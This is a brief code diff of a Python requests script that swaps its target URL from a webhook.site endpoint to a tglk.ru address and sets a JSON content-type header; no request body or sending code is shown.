@@ -1,7 +1,7 @@
 import requests
 from requests.structures import CaseInsensitiveDict
 
-url = "https://webhook.site/dc1beebb-ae1c-4934-aa6f-b1a4a7c8cb0e"
+url = "https://tglk.ru/in/5zJzjtgyEhkBaaa5"
 
 headers = CaseInsensitiveDict()
 headers["Content-Type"] = "application/json"
